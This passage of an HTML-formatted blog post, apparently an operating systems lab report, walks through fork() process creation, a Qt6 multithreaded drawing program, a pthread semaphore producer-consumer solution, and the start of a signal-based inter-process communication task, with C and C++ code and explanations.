class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="comment">// Child process enters infinite loop</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process print: Child process PID: %d, Parent process PID: %d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent process print: Parent process PID: %d, Child process PID: %d\n&quot;</span>, getpid(), pid);</span><br><span class="line">        sleep(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to create child process\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1_run.png"alt="Program execution result" /><figcaption aria-hidden="true">Program execution result</figcaption></figure><p>Parent process PID=3604, child process PID=3605, then after theparent process ends after 20s, the child process prints its own PID andparent process PID. Within the 20s before the parent process ends, thechild process prints parent process PID=3604, but after the parentprocess ends, the child process continues running, and at this time theparent process ID becomes 1. The reason for this effect is:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1-explain.png"alt="Reason why child process’s parent process ID becomes 1 after parent process ends" /><figcaption aria-hidden="true">Reason why child process’s parent processID becomes 1 after parent process ends</figcaption></figure><h3 id="effect-two">Effect Two</h3><p>Child process ends before parent process, and uses exit to return avalue, parent process prints this status value.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process print: Child process PID: %d, Parent process PID: %d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">42</span>); <span class="comment">// Use exit to return status value 42</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status); <span class="comment">// wait for child process to finish</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process exit status: %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to create child process\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program2_run.png"alt="Program execution result" /><figcaption aria-hidden="true">Program execution result</figcaption></figure><p>In the code, child process exit(42), parent process prints the exitstatus code 42.</p><p><ahref="https://blog.csdn.net/qq_43412060/article/details/105442802">【Linux】——ProcessCreation fork() Detailed Explanation</a></p><h2id="task-3-use-threads-to-implement-concurrent-drawing-of-circles-and-squares-in-windowslinux">Task3: Use Threads to Implement Concurrent Drawing of Circles and Squares inWindows/Linux</h2><p>For this task, I used Qt6 to implement a dual-threaded GUI interfacefor drawing circles and squares. Here I only explain the core codeparts:</p><p>Since Qt’s <strong>drawing actions can only be completed in the mainthread</strong>, our two threads for drawing circles and squares areused to calculate the coordinate points of circles and squaresrespectively, and pass them to the main thread, which completes thecorresponding drawing actions.</p><p>Project file directory is as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-directory.png"alt="Project file directory" /><figcaption aria-hidden="true">Project file directory</figcaption></figure><p>First, Qt needs to overwrite paintEvent in the MainWindow class todraw graphics:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::paintEvent</span><span class="params">(QPaintEvent *event)</span> </span>&#123;</span><br><span class="line">    <span class="function">QPainter <span class="title">painter</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">    <span class="comment">// Draw all circle points</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : circlePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Connect points to draw circle (optional)</span></span><br><span class="line">    <span class="keyword">if</span> (circlePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::red);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(circlePoints.<span class="built_in">constData</span>(), circlePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Draw all square points</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : squarePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Connect points to draw square (optional)</span></span><br><span class="line">    <span class="keyword">if</span> (squarePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(squarePoints.<span class="built_in">constData</span>(), squarePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Two thread-related classes, one is a circle thread class, one is asquare thread class, they are both subclasses of Qt’s thread classQThread. Since they only differ in coordinate point calculation, I’llchoose the circle thread class to explain:</p><p>The process function in the circle thread class is used to handle thenext coordinate point, then emit the circlePoint signal, passing thiscoordinate to the main thread for processing.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> radianIncrement = <span class="number">2</span> * (M_PI / <span class="number">180.0</span>); <span class="comment">// Radian increment each time (1 degree)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Calculate new point position, using circle&#x27;s parametric equation as example</span></span><br><span class="line">    <span class="type">int</span> centerX = center.<span class="built_in">x</span>();</span><br><span class="line">    <span class="type">int</span> centerY = center.<span class="built_in">y</span>();</span><br><span class="line">    <span class="type">int</span> x = centerX + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">cos</span>(circleAngle));</span><br><span class="line">    <span class="type">int</span> y = centerY + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">sin</span>(circleAngle));</span><br><span class="line">    circleAngle += radianIncrement;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send new point position</span></span><br><span class="line">    <span class="function">emit <span class="title">circlePoint</span><span class="params">(QPoint(x, y))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For the circle thread class, we need to overwrite the run function.The run function is called when the thread starts. The specific logic isto call the process function at intervals. The process function handlespoint information and then sends it to the main thread.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">isInterruptionRequested</span>()) &#123;</span><br><span class="line">        <span class="built_in">process</span>();</span><br><span class="line">        <span class="keyword">if</span> (circleAngle &gt;= <span class="number">2</span> * M_PI) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">msleep</span>(<span class="number">62</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>What the main thread needs to do is initialize an instance of thecircle thread class and connect the circlePoint signal mentioned earlierwith the slot that handles points. Note that the Slot function iswritten as a Lambda expression, adding the points returned from thechild thread to the circle point set, then updating the drawing.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create circle drawing thread</span></span><br><span class="line">circleThread = <span class="keyword">new</span> <span class="built_in">CircleThread</span>(<span class="keyword">this</span>, <span class="built_in">QPoint</span>(<span class="built_in">width</span>() / <span class="number">4</span>, <span class="built_in">height</span>() / <span class="number">2</span> - <span class="built_in">height</span>() / <span class="number">10</span>), <span class="built_in">qMin</span>(<span class="built_in">width</span>() / <span class="number">2</span>, <span class="built_in">height</span>()) / <span class="number">2</span> - <span class="number">50</span>);</span><br><span class="line"><span class="comment">// Connect circle drawing thread&#x27;s data sending signal with main thread&#x27;s data receiving slot function</span></span><br><span class="line"><span class="built_in">connect</span>(circleThread, &amp;CircleThread::circlePoint, <span class="keyword">this</span>, [&amp;](<span class="type">const</span> QPoint &amp;pt) &#123;</span><br><span class="line">    circlePoints.<span class="built_in">append</span>(pt);</span><br><span class="line">    <span class="comment">// Update to call paintEvent</span></span><br><span class="line">    <span class="built_in">update</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The final step is relatively simple. We need to start the threads,and thread startup is controlled by the “Start Drawing” button. Clickingit starts both threads.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is a slot function used to connect with button&#x27;s click signal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::on_startpaint_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Start circle drawing thread</span></span><br><span class="line">    circleThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">    <span class="comment">// Start square drawing thread</span></span><br><span class="line">    squareThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Finally, start the program. The program execution effect is asfollows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/双线程画圆方.gif"alt="Program execution effect" /><figcaption aria-hidden="true">Program execution effect</figcaption></figure><p>Reference Materials:</p><p><ahref="https://blog.csdn.net/qq_48985554/article/details/114990083">QtMulti-threading Method 1 (Step-by-step explanation + code +demonstration)</a></p><p><a href="https://doc.qt.io/">Qt Documentation</a></p><h2id="task-4-use-threads-to-implement-producer-consumer-synchronization-control-in-windows-or-linux">Task4: Use Threads to Implement “Producer-Consumer” Synchronization Controlin Windows or Linux</h2><p>Task Requirements:</p><ol type="1"><li>Use an array (10 elements) instead of a buffer. 2 input threadsproduce products (random numbers) and store them in the array; 3 outputthreads take numbers from the array and output them.</li><li>Linux uses mutex objects and lightweight semaphore objects, mainfunctions: sem_wait(), sem_post(), pthread_mutex_lock(),pthread_mutex_unlock()</li><li>Producer 1 data: 1000-1999 (random interval 100ms-1s for each data),Producer 2 data: 2000-2999 (random interval 100ms-1s for each data)</li><li>Consumers sleep for random time 100ms-1s to consume one data.</li><li>Screen print (or log file record) production and consumption recordsfor each data.</li></ol><p>Source code is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Buffer and related synchronization mechanisms</span></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>, out = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="type">sem_t</span> empty, full;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Random sleep time</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">random_sleep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">901</span> + <span class="number">100</span>; <span class="comment">// Random time from 100ms to 1s</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Producer thread function</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line">    <span class="type">int</span> base = id == <span class="number">1</span> ? <span class="number">1000</span> : <span class="number">2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> product = base + rand() % <span class="number">1000</span>;</span><br><span class="line">        sem_wait(&amp;empty);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Store product in buffer</span></span><br><span class="line">        buffer[in] = product;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer %d produced %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;full);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// Sleep</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Consumer thread function</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sem_wait(&amp;full);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Take product from buffer</span></span><br><span class="line">        <span class="type">int</span> product = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer %d consumed %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;empty);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// Sleep</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producers[<span class="number">2</span>], consumers[<span class="number">3</span>];</span><br><span class="line">    <span class="type">int</span> producer_ids[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">int</span> consumer_ids[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize mutex with default attributes</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// Second parameter 0 means semaphore is used for inter-thread synchronization</span></span><br><span class="line">    sem_init(&amp;empty, <span class="number">0</span>, BUFFER_SIZE); <span class="comment">// Start with BUFFER_SIZE empty slots</span></span><br><span class="line">    sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);            <span class="comment">// Start with no products available for consumption</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create producer and consumer threads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;producers[i], <span class="literal">NULL</span>, producer, &amp;producer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;consumers[i], <span class="literal">NULL</span>, consumer, &amp;consumer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for threads to finish</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(producers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(consumers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destroy mutex and semaphores</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    sem_destroy(&amp;empty);</span><br><span class="line">    sem_destroy(&amp;full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Code Analysis:</p><p>First, we should add a mutex lock to the product area to preventsimultaneous access by multiple threads. Then we need to ensure thatwhen the product buffer is full, producers stop producing, and whenthere are no products, consumers cannot consume. So we need P-Voperations to complete the synchronization mechanism. The empty signalrepresents the current empty slots in the buffer. Whenever a producerstarts producing, empty slots decrease by 1; after a consumer consumes,empty slots increase by 1. The full signal represents the current numberof products in the buffer. When a consumer starts consuming, itdecreases by 1; when a producer finishes producing, it increases by 1.This implements the synchronization mechanism between producers andconsumers.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Producer*/</span></span><br><span class="line">sem_wait(&amp;empty);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store product in buffer</span></span><br><span class="line">buffer[in] = product;</span><br><span class="line">in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Producer %d produced %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;full);</span><br><span class="line"><span class="comment">/*Producer*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Consumer*/</span></span><br><span class="line">sem_wait(&amp;full);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Take product from buffer</span></span><br><span class="line"><span class="type">int</span> product = buffer[out];</span><br><span class="line">out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Consumer %d consumed %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;empty);</span><br><span class="line"><span class="comment">/*Consumer*/</span></span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-result.png"alt="Program execution result" /><figcaption aria-hidden="true">Program execution result</figcaption></figure><p>Use ps command to view all threads in the current process:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-ps.png"alt="Use ps command to view all threads in the current process" /><figcaption aria-hidden="true">Use ps command to view all threads in thecurrent process</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/WCHAN-explain.png"alt="WCHAN explanation" /><figcaption aria-hidden="true">WCHAN explanation</figcaption></figure><p>Reference Materials:</p><p><ahref="https://blog.csdn.net/star_fighting/article/details/104309371">ThreadSynchronization Problem - Producer Consumer</a></p><h2id="task-5-use-signal-mechanism-signal-to-implement-inter-process-communication-in-linux">Task5: Use Signal Mechanism (signal) to Implement Inter-ProcessCommunication in Linux</h2><p>Task Requirements:</p><ol type="1"><li>Parent process creates (fork) child process and makes child processenter infinite loop.</li><li>Child process outputs “I am Child Process, alive !” every 2seconds</li><li>Parent process asks user “To terminate Child Process. Yes or No? ”requiring user to answer Y or N from keyboard. If user answers N, delay2 seconds before asking again.</li><li>If user answers Y, send user signal to child process to make itend.</li><li>Before child process ends, print string: “Bye,World !”</li><li>Functions: kill(), signal(), use user signal, write signal handlerfunction</li></ol><p>The core of this task is to use the kill function to terminate thechild process, and pass a signal SIGUSR1 when killing (user-definedsignal that can be used to report abnormal behavior such as division byzero errors, segmentation faults, etc., or to control processes such asterminating processes, stopping (pausing) processes, continuing(resuming) stopped processes, etc.). The child process receives thesignal and calls the signalHandler signal processing function to performcorresponding operations.</p><p>Source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 